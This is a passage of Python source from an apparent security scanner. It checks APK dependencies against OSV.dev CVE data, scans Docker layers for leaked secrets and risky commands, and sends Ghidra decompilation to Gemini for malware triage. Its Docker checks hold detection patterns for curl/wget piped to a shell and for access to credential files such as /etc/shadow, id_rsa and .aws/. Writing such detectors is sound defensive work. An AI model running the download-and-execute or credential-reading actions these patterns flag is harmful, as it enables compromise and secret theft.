    # Method 2: Parse gradle file if available
    if gradle_content:
        # Extract implementation/api/compile dependencies
        dep_patterns = [
            r"implementation\s*['\"]([^'\"]+)['\"]",
            r"api\s*['\"]([^'\"]+)['\"]",
            r"compile\s*['\"]([^'\"]+)['\"]",
            r"implementation\s*\(['\"]([^'\"]+)['\"]\)",
        ]
        
        for pattern in dep_patterns:
            matches = re.findall(pattern, gradle_content)
            for match in matches:
                # Parse maven coordinate: group:artifact:version
                parts = match.split(":")
                if len(parts) >= 2:
                    group_artifact = f"{parts[0]}:{parts[1]}"
                    version = parts[2] if len(parts) > 2 else None
                    
                    # Find matching prefix or create new entry
                    found = False
                    for prefix, (maven_coord, ecosystem) in KNOWN_ANDROID_LIBRARIES.items():
                        if maven_coord.startswith(group_artifact.split(":")[0]):
                            if prefix not in libraries:
                                is_high_risk = prefix in HIGH_RISK_LIBRARIES
                                libraries[prefix] = ApkLibraryInfo(
                                    package_prefix=prefix,
                                    maven_coordinate=group_artifact,
                                    ecosystem="Maven",
                                    version=version,
                                    class_count=0,
                                    is_high_risk=is_high_risk,
                                    risk_reason=HIGH_RISK_LIBRARIES.get(prefix),
                                )
                            elif version and not libraries[prefix].version:
                                libraries[prefix].version = version
                            found = True
                            break
                    
                    if not found and len(parts) >= 2:
                        # Unknown library from gradle
                        prefix = parts[0]
                        is_high_risk = any(risk in prefix for risk in ['apache', 'jackson', 'bouncy'])
                        libraries[prefix] = ApkLibraryInfo(
                            package_prefix=prefix,
                            maven_coordinate=group_artifact,
                            ecosystem="Maven",
                            version=version,
                            class_count=0,
                            is_high_risk=is_high_risk,
                            risk_reason="Unknown library - review manually" if is_high_risk else None,
                        )
    
    return list(libraries.values())


async def lookup_apk_cves(libraries: List[ApkLibraryInfo]) -> List[Dict[str, Any]]:
    """
    Look up CVEs for detected APK libraries using OSV.dev API.
    
    Args:
        libraries: List of detected libraries
        
    Returns:
        List of vulnerability dictionaries
    """
    import httpx
    
    OSV_URL = "https://api.osv.dev/v1/query"
    vulnerabilities = []
    
    async with httpx.AsyncClient(timeout=30) as client:
        for lib in libraries:
            try:
                # Query OSV for this package
                payload = {
                    "package": {
                        "name": lib.maven_coordinate,
                        "ecosystem": lib.ecosystem
                    }
                }
                
                # Add version if known
                if lib.version:
                    payload["version"] = lib.version
                
                resp = await client.post(OSV_URL, json=payload)
                
                if resp.status_code == 200:
                    data = resp.json()
                    vulns = data.get("vulns", [])
                    
                    for vuln in vulns:
                        # Parse CVSS score
                        cvss_score = None
                        severity = "medium"
                        
                        for sev in vuln.get("severity", []):
                            if sev.get("type") == "CVSS_V3":
                                cvss_score = float(sev.get("score", 0))
                                if cvss_score >= 9.0:
                                    severity = "critical"
                                elif cvss_score >= 7.0:
                                    severity = "high"
                                elif cvss_score >= 4.0:
                                    severity = "medium"
                                else:
                                    severity = "low"
                                break
                        
                        # Extract affected versions and fixed version
                        affected_versions = []
                        fixed_version = None
                        for affected in vuln.get("affected", []):
                            for range_info in affected.get("ranges", []):
                                for event in range_info.get("events", []):
                                    if "fixed" in event:
                                        fixed_version = event['fixed']
                                        affected_versions.append(f"Fixed in {fixed_version}")
                        
                        # FIX #2: Calculate CVE match confidence based on version info
                        cve_confidence = "low"
                        version_matches = False
                        
                        if lib.version and lib.version != "unknown":
                            if lib.version_confidence == "high":
                                cve_confidence = "high"
                            elif lib.version_confidence == "medium":
                                cve_confidence = "medium"
                            else:
                                cve_confidence = "medium"
                            
                            # Check if our version is affected
                            if fixed_version:
                                try:
                                    from packaging import version as pkg_version
                                    if pkg_version.parse(lib.version) < pkg_version.parse(fixed_version):
                                        version_matches = True
                                except:
                                    # If we can't parse versions, assume it could be affected
                                    version_matches = True
                            else:
                                version_matches = True  # No fix version means still affected
                        else:
                            # No version info - we can't confirm if this CVE applies
                            cve_confidence = "low"
                            version_matches = True  # Assume possibly affected
                        
                        # Extract references
                        references = []
                        for ref in vuln.get("references", [])[:3]:
                            references.append(ref.get("url", ""))
                        
                        vulnerabilities.append({
                            "library": lib.maven_coordinate,
                            "library_version": lib.version or "unknown",
                            "version_source": getattr(lib, 'version_source', 'unknown'),
                            "cve_id": vuln.get("id", "Unknown"),
                            "aliases": vuln.get("aliases", []),
                            "summary": vuln.get("summary", "No description available"),
                            "details": vuln.get("details", "")[:500],
                            "severity": severity,
                            "cvss_score": cvss_score,
                            "affected_versions": affected_versions,
                            "fixed_version": fixed_version,
                            "references": references,
                            "published": vuln.get("published", ""),
                            "modified": vuln.get("modified", ""),
                            # FIX #2: Add confidence field
                            "cve_confidence": cve_confidence,
                            "version_confirmed": version_matches,
                            # Attack-focused fields
                            "exploitation_potential": _assess_exploitation_potential(vuln, lib),
                            "attack_vector": _determine_attack_vector(vuln),
                        })
                        
            except Exception as e:
                logger.warning(f"CVE lookup failed for {lib.maven_coordinate}: {e}")
    
    # Sort by severity (critical first)
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    vulnerabilities.sort(key=lambda x: severity_order.get(x.get("severity", "low"), 4))
    
    return vulnerabilities


def _assess_exploitation_potential(vuln: Dict, lib: ApkLibraryInfo) -> str:
    """Assess how exploitable a vulnerability is from an attacker's perspective."""
    summary = vuln.get("summary", "").lower()
    details = vuln.get("details", "").lower()
    combined = summary + " " + details
    
    # High exploitation potential indicators
    if any(term in combined for term in ["remote code execution", "rce", "arbitrary code"]):
        return "CRITICAL - Remote Code Execution possible"
    if any(term in combined for term in ["authentication bypass", "auth bypass"]):
        return "HIGH - Authentication can be bypassed"
    if any(term in combined for term in ["sql injection", "sqli"]):
        return "HIGH - Database compromise possible"
    if any(term in combined for term in ["deserialization", "deserialize"]):
        return "HIGH - Deserialization attack possible"
    if any(term in combined for term in ["path traversal", "directory traversal"]):
        return "HIGH - File system access possible"
    if any(term in combined for term in ["ssrf", "server-side request"]):
        return "MEDIUM - Internal network access possible"
    if any(term in combined for term in ["xss", "cross-site scripting"]):
        return "MEDIUM - User session hijacking possible"
    if any(term in combined for term in ["denial of service", "dos", "crash"]):
        return "LOW - Service disruption possible"
    if any(term in combined for term in ["information disclosure", "leak"]):
        return "MEDIUM - Sensitive data exposure possible"
    
    return "Review required - assess based on app context"


def _determine_attack_vector(vuln: Dict) -> str:
    """Determine the attack vector from vulnerability details."""
    summary = vuln.get("summary", "").lower()
    details = vuln.get("details", "").lower()
    combined = summary + " " + details
    
    if any(term in combined for term in ["network", "remote", "http", "https", "api"]):
        return "Network - Exploitable remotely"
    if any(term in combined for term in ["local", "physical", "device"]):
        return "Local - Requires device access"
    if any(term in combined for term in ["user interaction", "click", "open"]):
        return "User Interaction - Requires victim action"
    if any(term in combined for term in ["adjacent", "lan", "bluetooth"]):
        return "Adjacent Network - Requires proximity"
    
    return "Unknown - Review vulnerability details"


def analyze_apk_security(manifest_data: Dict, strings: List[ExtractedString], urls: List[str]) -> List[Dict[str, Any]]:
    """Analyze APK for security issues."""
    issues = []
    
    # Check for dangerous permissions
    dangerous_perms = [p for p in manifest_data.get("permissions", []) if p.is_dangerous]
    if dangerous_perms:
        issues.append({
            "category": "Dangerous Permissions",
            "severity": "high",
            "description": f"App requests {len(dangerous_perms)} dangerous permissions",
            "details": [{"name": p.name, "description": p.description} for p in dangerous_perms],
        })
    
    # Check for exported components
    exported = [c for c in manifest_data.get("components", []) if c.is_exported]
    if exported:
        issues.append({
            "category": "Exported Components",
            "severity": "medium",
            "description": f"App has {len(exported)} exported components",
            "details": [{"name": c.name, "type": c.component_type} for c in exported[:10]],
        })
    
    # Check for HTTP URLs (not HTTPS)
    http_urls = [u for u in urls if u.startswith('http://') and not u.startswith('http://localhost')]
    if http_urls:
        issues.append({
            "category": "Insecure Network",
            "severity": "medium",
            "description": f"App contains {len(http_urls)} insecure HTTP URLs",
            "details": http_urls[:10],
        })
    
    # Check for hardcoded IPs
    ip_strings = [s.value for s in strings if s.category == "ip_address"]
    if ip_strings:
        issues.append({
            "category": "Hardcoded IPs",
            "severity": "low",
            "description": f"App contains {len(set(ip_strings))} hardcoded IP addresses",
            "details": list(set(ip_strings))[:10],
        })
    
    # Check for debugging flags
    debug_strings = [s for s in strings if 'debuggable' in s.value.lower() or 'debug' in s.value.lower()]
    if debug_strings:
        issues.append({
            "category": "Debug Mode",
            "severity": "medium",
            "description": "App may have debugging enabled",
        })
    
    return issues


# ============================================================================
# Docker Layer Analysis Functions
# ============================================================================

def _normalize_image_id(image_id: str) -> str:
    """Normalize image ID by stripping known prefixes."""
    if not image_id:
        return ""
    if image_id.startswith("sha256:"):
        return image_id.split(":", 1)[1]
    return image_id


def _clean_base_image(value: Optional[str]) -> Optional[str]:
    """Normalize base image references and filter empty placeholders."""
    if not value:
        return None
    cleaned = value.strip()
    if not cleaned or cleaned in {"<missing>", "scratch"}:
        return None
    return cleaned


def _extract_base_from_history(layers: List[Dict[str, Any]]) -> Optional[str]:
    """Try to parse a FROM reference out of history commands."""
    base_image = None
    for layer in layers:
        command = layer.get("command", "")
        match = re.search(r'\bFROM\s+([^\s]+)', command, re.IGNORECASE)
        if match:
            base_image = match.group(1).strip()
    return base_image


def _resolve_image_name_from_parent(parent_id: Optional[str]) -> Optional[str]:
    """Resolve parent image ID to a repo tag, if available."""
    if not parent_id:
        return None
    normalized_parent = _normalize_image_id(parent_id)
    if not normalized_parent:
        return None

    try:
        result = subprocess.run(
            ["docker", "images", "--no-trunc", "--format", "{{.Repository}}:{{.Tag}}|||{{.ID}}"],
            capture_output=True,
            text=True,
            timeout=20,
        )
        if result.returncode != 0:
            return None

        for line in result.stdout.splitlines():
            if not line.strip():
                continue
            parts = line.split("|||")
            if len(parts) != 2:
                continue
            repo_tag, image_id = parts[0].strip(), parts[1].strip()
            if repo_tag.startswith("<none>"):
                continue
            if _normalize_image_id(image_id).startswith(normalized_parent):
                return repo_tag
    except Exception as e:
        logger.debug(f"Failed to resolve parent image: {e}")

    return None


def _infer_base_image(image_info: Dict[str, Any], layers: List[Dict[str, Any]], image_name: str) -> Optional[str]:
    """Infer the base image reference using inspect metadata and history heuristics."""
    base_image = _clean_base_image(image_info.get("Config", {}).get("Image"))
    if not base_image:
        base_image = _clean_base_image(image_info.get("ContainerConfig", {}).get("Image"))
    if not base_image:
        base_image = _extract_base_from_history(layers)
    if not base_image:
        base_image = _resolve_image_name_from_parent(image_info.get("Parent"))
    if not base_image:
        for tag in image_info.get("RepoTags") or []:
            base_image = _clean_base_image(tag)
            if base_image:
                break
    if not base_image:
        base_image = _clean_base_image(image_name)
    return base_image


def analyze_docker_image(image_name: str) -> DockerLayerAnalysisResult:
    """Analyze Docker image layers for secrets and security issues."""
    try:
        # Get image history
        result = subprocess.run(
            ["docker", "history", "--no-trunc", "--format", "{{.ID}}|||{{.CreatedBy}}|||{{.Size}}", image_name],
            capture_output=True,
            text=True,
            timeout=60,
        )
        
        if result.returncode != 0:
            return DockerLayerAnalysisResult(
                image_name=image_name,
                image_id="unknown",
                total_layers=0,
                total_size=0,
                base_image=None,
                layers=[],
                secrets=[],
                deleted_files=[],
                security_issues=[],
                error=f"Docker command failed: {result.stderr}",
            )
        
        # Parse history
        layers = []
        secrets = []
        security_issues = []
        total_size = 0
        
        for line in result.stdout.strip().split('\n'):
            if not line.strip():
                continue
            
            parts = line.split('|||')
            if len(parts) < 3:
                continue
            
            layer_id = parts[0].strip()
            command = parts[1].strip()
            size_str = parts[2].strip()
            
            # Parse size
            try:
                if 'GB' in size_str:
                    size = int(float(size_str.replace('GB', '')) * 1024 * 1024 * 1024)
                elif 'MB' in size_str:
                    size = int(float(size_str.replace('MB', '')) * 1024 * 1024)
                elif 'KB' in size_str or 'kB' in size_str:
                    size = int(float(size_str.replace('KB', '').replace('kB', '')) * 1024)
                elif 'B' in size_str:
                    size = int(float(size_str.replace('B', '')))
                else:
                    size = 0
            except:
                size = 0
            
            total_size += size
            
            layer = {
                "id": layer_id[:12] if layer_id != "<missing>" else "inherited",
                "command": command[:500],
                "size": size,
            }
            layers.append(layer)
            
            # Check for secrets in layer commands
            layer_secrets = detect_secrets_in_layer(layer_id[:12], command)
            secrets.extend(layer_secrets)
            
            # Check for security issues
            layer_issues = check_layer_security(command)
            security_issues.extend(layer_issues)
        
        # Inspect image metadata for ID and base image inference
        image_id = "unknown"
        base_image = None
        inspect_result = subprocess.run(
            ["docker", "inspect", image_name],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if inspect_result.returncode == 0:
            try:
                inspect_data = json.loads(inspect_result.stdout)
                if inspect_data:
                    image_info = inspect_data[0]
                    raw_id = image_info.get("Id") or ""
                    if raw_id:
                        image_id = _normalize_image_id(raw_id)[:12]
                    base_image = _infer_base_image(image_info, layers, image_name)
            except Exception as e:
                logger.warning(f"Failed to parse docker inspect output: {e}")
        else:
            logger.warning(f"Docker inspect failed: {inspect_result.stderr}")
        
        return DockerLayerAnalysisResult(
            image_name=image_name,
            image_id=image_id,
            total_layers=len(layers),
            total_size=total_size,
            base_image=base_image,
            layers=layers,
            secrets=secrets,
            deleted_files=[],
            security_issues=security_issues,
        )
        
    except subprocess.TimeoutExpired:
        return DockerLayerAnalysisResult(
            image_name=image_name,
            image_id="unknown",
            total_layers=0,
            total_size=0,
            base_image=None,
            layers=[],
            secrets=[],
            deleted_files=[],
            security_issues=[],
            error="Docker command timed out",
        )
    except Exception as e:
        logger.error(f"Docker analysis failed: {e}")
        return DockerLayerAnalysisResult(
            image_name=image_name,
            image_id="unknown",
            total_layers=0,
            total_size=0,
            base_image=None,
            layers=[],
            secrets=[],
            deleted_files=[],
            security_issues=[],
            error=str(e),
        )


def detect_secrets_in_layer(layer_id: str, command: str) -> List[DockerLayerSecret]:
    """Detect secrets in Docker layer commands."""
    secrets = []
    
    # Check for secrets in ENV commands
    env_patterns = [
        (r'ENV\s+(\w*(?:PASSWORD|SECRET|KEY|TOKEN|API_KEY|CREDENTIAL)\w*)\s*=\s*["\']?([^\s"\']+)', "env_secret"),
        (r'ARG\s+(\w*(?:PASSWORD|SECRET|KEY|TOKEN|API_KEY|CREDENTIAL)\w*)\s*=\s*["\']?([^\s"\']+)', "arg_secret"),
        (r'--password[=\s]+["\']?([^\s"\']+)', "password_arg"),
        (r'--secret[=\s]+["\']?([^\s"\']+)', "secret_arg"),
        (r'--api-key[=\s]+["\']?([^\s"\']+)', "api_key_arg"),
    ]
    
    for pattern, secret_type in env_patterns:
        matches = re.finditer(pattern, command, re.IGNORECASE)
        for match in matches:
            if match.lastindex and match.lastindex >= 1:
                value = match.group(match.lastindex)
                
                # Skip placeholders
                if value.startswith('$') or value in {'password', 'secret', 'changeme', 'your-'}:
                    continue
                
                # Mask value
                if len(value) > 8:
                    masked = value[:3] + '*' * (len(value) - 6) + value[-3:]
                else:
                    masked = value[:2] + '*' * max(len(value) - 2, 1)
                
                secrets.append(DockerLayerSecret(
                    layer_id=layer_id,
                    layer_command=command[:200],
                    secret_type=secret_type,
                    value=value,
                    masked_value=masked,
                    context=match.group(0)[:100],
                    severity="critical" if "password" in secret_type.lower() else "high",
                ))
    
    # Check for secret patterns in commands
    for secret_type, pattern in SECRET_PATTERNS.items():
        matches = pattern.finditer(command)
        for match in matches:
            value = match.group(1) if match.lastindex else match.group(0)
            
            if value.lower() in {'password', 'secret', 'token', 'example'}:
                continue
            
            if len(value) > 8:
                masked = value[:3] + '*' * (len(value) - 6) + value[-3:]
            else:
                masked = value[:2] + '*' * max(len(value) - 2, 1)
            
            secrets.append(DockerLayerSecret(
                layer_id=layer_id,
                layer_command=command[:200],
                secret_type=secret_type,
                value=value,
                masked_value=masked,
                context=match.group(0)[:100],
                severity=get_secret_severity(secret_type),
            ))
    
    return secrets


def check_layer_security(command: str) -> List[Dict[str, Any]]:
    """Check Docker layer command for security issues."""
    issues = []
    
    # Running as root
    if re.search(r'\bUSER\s+root\b', command, re.IGNORECASE):
        issues.append({
            "category": "Running as Root",
            "severity": "medium",
            "description": "Container runs as root user",
            "command": command[:200],
        })
    
    # Sensitive file operations
    sensitive_paths = ['/etc/passwd', '/etc/shadow', '.ssh/', 'id_rsa', '.aws/', '.kube/']
    for path in sensitive_paths:
        if path in command.lower():
            issues.append({
                "category": "Sensitive File Access",
                "severity": "high",
                "description": f"Layer accesses sensitive path: {path}",
                "command": command[:200],
            })
            break
    
    # curl/wget piped to shell
    if re.search(r'(curl|wget)\s+.*\|\s*(sh|bash)', command, re.IGNORECASE):
        issues.append({
            "category": "Remote Code Execution",
            "severity": "high",
            "description": "Script downloaded and executed directly",
            "command": command[:200],
        })
    
    # chmod 777
    if re.search(r'\bchmod\b[^\n]*(?:0?777|a\+rwx|ugo\+rwx|u\+rwx[, ]*g\+rwx[, ]*o\+rwx)', command, re.IGNORECASE):
        issues.append({
            "category": "Insecure Permissions",
            "severity": "medium",
            "description": "Files given world-writable permissions",
            "command": command[:200],
        })
    
    return issues


# ============================================================================
# AI Analysis Functions
# ============================================================================

# Structured AI analysis response model
@dataclass
class AIAnalysisStructured:
    """Structured AI analysis result."""
    risk_level: str  # Critical, High, Medium, Low, Clean
    risk_score: int  # 0-100
    summary: str
    key_findings: List[Dict[str, Any]]
    malware_indicators: List[str]
    recommendations: List[str]
    iocs: Dict[str, List[str]]  # Indicators of Compromise (urls, ips, domains, hashes)
    attack_techniques: List[str]  # MITRE ATT&CK techniques if applicable
    confidence: float  # 0.0-1.0


def analyze_binary_with_ghidra(
    file_path: Path,
    max_functions: int = 200,
    decomp_limit: int = 4000,
) -> Optional[Dict[str, Any]]:
    """Run Ghidra headless decompilation and return parsed JSON data."""
    try:
        from backend.services.ghidra_service import run_ghidra_decompilation

        result = run_ghidra_decompilation(
            file_path,
            max_functions=max_functions,
            decomp_limit=decomp_limit,
        )
        if "error" in result:
            return {"error": result["error"]}

        raw = result.get("data", "")
        if not raw:
            return {"error": "Ghidra returned no data"}

        try:
            return json.loads(raw)
        except Exception as exc:
            logger.error(f"Failed to parse Ghidra JSON: {exc}")
            return {"error": "Failed to parse Ghidra output"}
    except Exception as exc:
        logger.error(f"Ghidra analysis failed: {exc}")
        return {"error": f"Ghidra analysis failed: {exc}"}


async def analyze_ghidra_functions_with_ai(
    ghidra_analysis: Dict[str, Any],
    max_functions: int = 20,
    max_concurrency: int = 4,
) -> Optional[List[Dict[str, Any]]]:
    """Use Gemini to summarize decompiled functions from Ghidra output."""
    if not settings.gemini_api_key:
        return None

    functions = ghidra_analysis.get("functions") or []
    if not functions:
        return None

    try:
        from google import genai
        from google.genai import types

        client = genai.Client(api_key=settings.gemini_api_key)
        sem = asyncio.Semaphore(max_concurrency)

        async def analyze_function(func: Dict[str, Any]) -> Dict[str, Any]:
            name = func.get("name") or "unknown"
            entry = func.get("entry") or "0x0"
            size = func.get("size") or 0
            called = func.get("called_functions") or []
            decompiled = (func.get("decompiled") or "")[:8000]

            prompt = (
                "You are a reverse engineering analyst. Summarize the function below.\n\n"
                "Return a concise response with:\n"
                "- Purpose summary (1-2 sentences)\n"
                "- Risk level (Critical/High/Medium/Low/Clean)\n"
                "- Notable behaviors (bullet list)\n"
                "- Potential vulnerabilities or suspicious patterns (bullet list)\n\n"
                "Function metadata:\n"
                f"Name: {name}\n"
                f"Entry: {entry}\n"
                f"Size: {size} bytes\n"
                f"Calls: {', '.join(called[:15])}\n\n"
                "Decompiled code:\n"
                f"{decompiled}\n"
            )

            async with sem:
                # Use retry for Ghidra function analysis
                response = await gemini_request_with_retry(
                    lambda: client.aio.models.generate_content(
                        model=settings.gemini_model_id,
                        contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
                    ),
                    max_retries=3,
                    base_delay=2.0,
                    timeout_seconds=120.0,
                    operation_name=f"Ghidra function {name} analysis"
                )
                
                if response is None:
                    return {"name": name, "entry": entry, "size": size, "summary": "Analysis failed"}

            return {
                "name": name,
                "entry": entry,
                "size": size,
                "summary": response.text or "",
            }

        targets = functions[:max_functions]
        results = await asyncio.gather(*(analyze_function(f) for f in targets))
        return results
    except Exception as exc:
        logger.error(f"Ghidra AI analysis failed: {exc}")
        return [{"error": f"Ghidra AI analysis failed: {exc}"}]


async def analyze_binary_with_ai(result: BinaryAnalysisResult) -> Optional[str]:
    """Use Gemini to provide comprehensive security analysis of binary."""
    if not settings.gemini_api_key:
        return None
    
    try:
        from google import genai
        from google.genai import types
        
        client = genai.Client(api_key=settings.gemini_api_key)
        
        # Build detailed context
        suspicious_summary = "\n".join([
            f"- [{s['severity'].upper()}] {s['category']}: {s['description']}" 
            for s in result.suspicious_indicators
        ])
        
        secrets_summary = "\n".join([
            f"- [{s['severity'].upper()}] {s['type']}: {s['masked_value']}"
            for s in result.secrets[:15]
        ])
        
        # Get section entropy info
        section_info = ""
        if result.metadata.sections:
            section_info = "\n".join([
                f"- {s.get('name', 'N/A')}: size={s.get('raw_size', 0):,}B, entropy={s.get('entropy', 'N/A')}"
                for s in result.metadata.sections[:8]
            ])
        
        # Get notable imports
        suspicious_imports = [imp for imp in result.imports if imp.is_suspicious]
        imports_summary = "\n".join([
            f"- {imp.name} ({imp.library}): {imp.reason}"
            for imp in suspicious_imports[:20]
        ])
        
        # Get interesting strings
        interesting_strings = [s for s in result.strings if s.category in ('url', 'ip', 'email', 'path') or any(kw in s.value.lower() for kw in ('http', 'password', 'key', 'token', 'api', 'secret', 'cmd', 'exec', 'shell', 'powershell'))]
        strings_summary = "\n".join([
            f"- [{s.category or 'other'}] {s.value[:100]}"
            for s in interesting_strings[:30]
        ])

        ghidra_summary = ""
        if result.ghidra_ai_summaries:
            ghidra_summary = "\n".join([
                f"- {s.get('name', 'unknown')} ({s.get('entry', '0x0')}): {s.get('summary', '')[:200]}"
                for s in result.ghidra_ai_summaries[:15]
            ])

        prompt = f"""You are a malware analyst. Analyze this binary file and provide a comprehensive security assessment.

## FILE INFORMATION
- **Filename:** {result.filename}
- **Type:** {result.metadata.file_type}
- **Architecture:** {result.metadata.architecture}
- **Size:** {result.metadata.file_size:,} bytes
- **Entry Point:** {hex(result.metadata.entry_point) if result.metadata.entry_point else 'N/A'}
- **Compile Time:** {result.metadata.compile_time or 'Unknown'}
- **Packed:** {result.metadata.is_packed} {f'(Packer: {result.metadata.packer_name})' if result.metadata.packer_name else ''}

## SECTION ANALYSIS
{section_info or "No section data available"}

## SUSPICIOUS INDICATORS ({len(result.suspicious_indicators)})
{suspicious_summary or "None detected"}

## SUSPICIOUS IMPORTS ({len(suspicious_imports)})
{imports_summary or "None detected"}

## POTENTIAL SECRETS ({len(result.secrets)})
{secrets_summary or "None detected"}

## INTERESTING STRINGS ({len(interesting_strings)} of {len(result.strings)} total)
{strings_summary or "None of interest"}

## GHIDRA FUNCTION SUMMARIES
{ghidra_summary or "Not available"}

## ANALYSIS INSTRUCTIONS
Provide your analysis in the following structured format:

**RISK ASSESSMENT**
- Risk Level: [Critical/High/Medium/Low/Clean]
- Risk Score: [0-100]
- Confidence: [High/Medium/Low]

**EXECUTIVE SUMMARY**
[2-3 sentence summary of findings]

**KEY FINDINGS**
1. [Finding with severity and details]
2. [Continue for each significant finding]

**MALWARE INDICATORS**
- [List any indicators suggesting malicious behavior]

**MITRE ATT&CK TECHNIQUES**
- [List applicable techniques like T1055 Process Injection if detected]

**INDICATORS OF COMPROMISE (IOCs)**
- URLs: [list any malicious/suspicious URLs]
- IPs: [list any suspicious IPs]
- Domains: [list any suspicious domains]
- File Hashes: [if relevant]

**RECOMMENDATIONS**
1. [Specific actionable recommendation]
2. [Continue as needed]

Be thorough but concise. Focus on actionable intelligence."""

        # Use retry helper for reliability
        response = await gemini_request_with_retry(
            lambda: client.aio.models.generate_content(
                model=settings.gemini_model_id,
                contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
            ),
            max_retries=3,
            base_delay=2.0,
            timeout_seconds=180.0,
            operation_name="Binary AI analysis"
        )
        
        if response is None:
            return "AI analysis unavailable: All retry attempts failed"
        
        return response.text
        
    except Exception as e:
        logger.error(f"AI analysis failed: {e}")
        return f"AI analysis unavailable: {str(e)}"


@dataclass
class ApkAIReports:
    """AI-generated reports for APK analysis."""
    functionality_report: Optional[str] = None
    security_report: Optional[str] = None
    architecture_diagram: Optional[str] = None  # NEW: Mermaid diagram of code architecture
    attack_surface_map: Optional[str] = None  # NEW: Attack surface analysis
    legacy_report: Optional[str] = None  # Combined for backwards compatibility


async def analyze_apk_with_ai(
    result: ApkAnalysisResult, 
    output_dir: Optional[Path] = None, 
    decompiled_findings: Optional[List[Dict]] = None,
    verification_results: Optional[Dict[str, Any]] = None
) -> Optional[str]:
    """Use Gemini to provide comprehensive security analysis of APK."""
    reports = await generate_apk_ai_reports(result, output_dir, decompiled_findings, verification_results)
    if reports:
        # Return combined report for backwards compatibility
        result.ai_report_functionality = reports.functionality_report
        result.ai_report_security = reports.security_report
        result.ai_report_architecture = reports.architecture_diagram
        result.ai_report_attack_surface = reports.attack_surface_map
        return reports.legacy_report
    return None


# ============================================================================
# IMPROVEMENT 1: Resource File Scanning (strings.xml, AndroidManifest, etc.)
# ============================================================================

def _scan_resource_files(output_dir: Path) -> Dict[str, Any]:
    """
    Scan Android resource files for security-relevant information.
    These files often contain hardcoded secrets, API endpoints, and security configs.
    """
    resources = {
        "strings": [],
        "api_keys": [],
        "urls": [],
        "manifest_security": {},
        "network_security_config": {},
        "raw_configs": []
    }
    
    # Scan strings.xml files
    res_dir = output_dir / "resources"
    if res_dir.exists():
        for strings_file in res_dir.rglob("strings*.xml"):
            try:
                content = strings_file.read_text(encoding='utf-8', errors='ignore')
                
                # Extract string resources
                string_pattern = re.compile(r'<string\s+name="([^"]+)"[^>]*>([^<]+)</string>')
                for match in string_pattern.finditer(content):
                    name, value = match.groups()
                    name_lower = name.lower()
                    value_lower = value.lower()
                    
                    # Detect API keys/secrets
                    if any(kw in name_lower for kw in ['key', 'secret', 'token', 'api', 'password', 'auth']):
                        resources["api_keys"].append({
                            "name": name,
                            "value": value[:100] if len(value) > 100 else value,
                            "file": str(strings_file.name)
                        })
                    
                    # Detect URLs
                    if 'http' in value_lower or 'url' in name_lower or 'endpoint' in name_lower:
                        resources["urls"].append({
                            "name": name,
                            "value": value,
                            "file": str(strings_file.name)
                        })
                    
                    # Store interesting strings
                    if any(kw in name_lower for kw in ['server', 'host', 'domain', 'base', 'config']):
                        resources["strings"].append({
                            "name": name,
                            "value": value[:200],
                            "file": str(strings_file.name)
                        })
            except Exception as e:
                logger.debug(f"Error reading {strings_file}: {e}")
    
    # Scan AndroidManifest.xml
    manifest_path = output_dir / "resources" / "AndroidManifest.xml"
    if not manifest_path.exists():
        manifest_path = output_dir / "AndroidManifest.xml"
    
    if manifest_path.exists():
        try:
            content = manifest_path.read_text(encoding='utf-8', errors='ignore')
            
            # Check for dangerous settings
            resources["manifest_security"] = {
                "debuggable": 'android:debuggable="true"' in content,
                "allowBackup": 'android:allowBackup="true"' in content,
                "usesCleartextTraffic": 'android:usesCleartextTraffic="true"' in content,
                "exported_activities": len(re.findall(r'<activity[^>]*android:exported="true"', content)),
                "exported_services": len(re.findall(r'<service[^>]*android:exported="true"', content)),
                "exported_receivers": len(re.findall(r'<receiver[^>]*android:exported="true"', content)),
                "exported_providers": len(re.findall(r'<provider[^>]*android:exported="true"', content)),
                "custom_permissions": len(re.findall(r'<permission\s', content)),
                "deep_links": re.findall(r'<data\s+android:scheme="([^"]+)"', content),
            }
            
            # Extract intent filters for attack surface
            intent_filters = re.findall(r'<intent-filter[^>]*>(.*?)</intent-filter>', content, re.DOTALL)
            resources["manifest_security"]["intent_filter_count"] = len(intent_filters)
            
        except Exception as e:
            logger.debug(f"Error reading manifest: {e}")
    
    # Scan network_security_config.xml
    for nsc_path in [
        output_dir / "resources" / "res" / "xml" / "network_security_config.xml",
        output_dir / "res" / "xml" / "network_security_config.xml",
    ]:
        if nsc_path.exists():
            try:
                content = nsc_path.read_text(encoding='utf-8', errors='ignore')
                resources["network_security_config"] = {
                    "cleartextTrafficPermitted": 'cleartextTrafficPermitted="true"' in content,
                    "trustUserCerts": '<certificates src="user"' in content,
                    "pinning_enabled": '<pin-set' in content,
                    "domains_allowing_cleartext": re.findall(r'<domain[^>]*>([^<]+)</domain>', content)
                }
                break
            except Exception as e:
                logger.debug(f"Error reading network security config: {e}")
    
    # Scan raw config files
    raw_dir = output_dir / "resources" / "res" / "raw"
    if raw_dir.exists():
        for config_file in raw_dir.glob("*"):
            if config_file.suffix in ['.json', '.xml', '.properties', '.config', '.txt']:
                try:
                    content = config_file.read_text(encoding='utf-8', errors='ignore')[:5000]
                    # Look for secrets in config files
                    if any(kw in content.lower() for kw in ['api', 'key', 'secret', 'password', 'token', 'auth']):
                        resources["raw_configs"].append({
                            "file": config_file.name,
                            "content_preview": content[:500]
                        })
                except:
                    pass
    
    return resources


# ============================================================================
# IMPROVEMENT 2: Method-Level Extraction
# ============================================================================

def _extract_security_methods(content: str, class_name: str) -> List[Dict[str, Any]]:
    """
    Extract security-relevant methods from Java source code.
    Instead of grabbing arbitrary chunks, we extract specific methods by name/pattern.
    """
    methods = []
    
    # Security-relevant method name patterns
    security_method_patterns = [
        # Authentication
        (r'(?:public|private|protected)\s+\w+\s+(login|signIn|authenticate|checkPassword|verifyCredential|validateToken)\s*\([^)]*\)\s*(?:throws[^{]*)?\{', 'authentication'),
        (r'(?:public|private|protected)\s+\w+\s+(logout|signOut|invalidateSession|clearCredentials)\s*\([^)]*\)\s*(?:throws[^{]*)?\{', 'authentication'),
        
        # Encryption/Crypto
        (r'(?:public|private|protected)\s+\w+\s+(encrypt|decrypt|hash|sign|verify|generateKey)\s*\([^)]*\)\s*(?:throws[^{]*)?\{', 'cryptography'),
